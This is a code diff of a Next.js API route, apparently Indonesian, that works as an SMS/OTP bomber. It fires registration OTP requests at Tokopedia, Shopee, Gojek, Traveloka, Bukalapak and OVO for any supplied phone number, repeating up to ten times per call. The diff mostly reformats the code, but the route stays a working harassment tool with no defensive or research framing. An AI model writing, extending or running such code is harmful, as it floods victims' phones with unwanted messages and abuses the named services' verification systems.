@@ -2,105 +2,74 @@ import { NextRequest, NextResponse } from 'next/server'
 
 export const maxDuration = 60
 
+function sleep(ms: number) {
+  return new Promise(r => setTimeout(r, ms))
+}
+
 async function tokopedia(phone: string) {
   try {
     const res = await fetch('https://accounts.tokopedia.com/otp/c/page', {
       method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36'
-      },
+      headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36' },
       body: JSON.stringify({ phone, type: 'register' })
     })
     return { platform: 'Tokopedia', success: res.ok }
-  } catch {
-    return { platform: 'Tokopedia', success: false }
-  }
+  } catch { return { platform: 'Tokopedia', success: false } }
 }
 
 async function shopee(phone: string) {
   try {
     const res = await fetch('https://shopee.co.id/api/v2/authentication/send_otp/', {
       method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36',
-        'Referer': 'https://shopee.co.id/'
-      },
+      headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0', 'Referer': 'https://shopee.co.id/' },
       body: JSON.stringify({ phone_number: phone, support_whatsapp: false })
     })
     return { platform: 'Shopee', success: res.ok }
-  } catch {
-    return { platform: 'Shopee', success: false }
-  }
+  } catch { return { platform: 'Shopee', success: false } }
 }
 
 async function gojek(phone: string) {
   try {
     const res = await fetch('https://api.gojek.com/gojek/v1/register/send-otp', {
       method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36'
-      },
+      headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0' },
       body: JSON.stringify({ phone_number: phone })
     })
     return { platform: 'Gojek', success: res.ok }
-  } catch {
-    return { platform: 'Gojek', success: false }
-  }
+  } catch { return { platform: 'Gojek', success: false } }
 }
 
 async function traveloka(phone: string) {
   try {
     const res = await fetch('https://api.traveloka.com/v1/user/register/send-otp', {
       method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36'
-      },
+      headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0' },
       body: JSON.stringify({ phone })
     })
     return { platform: 'Traveloka', success: res.ok }
-  } catch {
-    return { platform: 'Traveloka', success: false }
-  }
+  } catch { return { platform: 'Traveloka', success: false } }
 }
 
 async function bukalapak(phone: string) {
   try {
     const res = await fetch('https://api.bukalapak.com/v1/auth/otp-request', {
       method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36'
-      },
+      headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0' },
       body: JSON.stringify({ phone })
     })
     return { platform: 'Bukalapak', success: res.ok }
-  } catch {
-    return { platform: 'Bukalapak', success: false }
-  }
+  } catch { return { platform: 'Bukalapak', success: false } }
 }
 
 async function ovo(phone: string) {
   try {
     const res = await fetch('https://api.ovo.id/v1/otp/send', {
       method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36'
-      },
+      headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0' },
       body: JSON.stringify({ mobile_phone: phone })
     })
     return { platform: 'OVO', success: res.ok }
-  } catch {
-    return { platform: 'OVO', success: false }
-  }
-}
-
-function sleep(ms: number) {
-  return new Promise(r => setTimeout(r, ms))
+  } catch { return { platform: 'OVO', success: false } }
 }
 
 export async function GET(req: NextRequest) {
@@ -109,10 +78,7 @@ export async function GET(req: NextRequest) {
   const jumlah = Math.min(parseInt(searchParams.get('jumlah') || '1'), 10)
 
   if (!phone) {
-    return NextResponse.json({
-      status: false,
-      message: 'Parameter phone wajib diisi'
-    }, { status: 400 })
+    return NextResponse.json({ status: false, message: 'Parameter phone wajib diisi' }, { status: 400 })
   }
 
   const platforms = [tokopedia, shopee, gojek, traveloka, bukalapak, ovo]
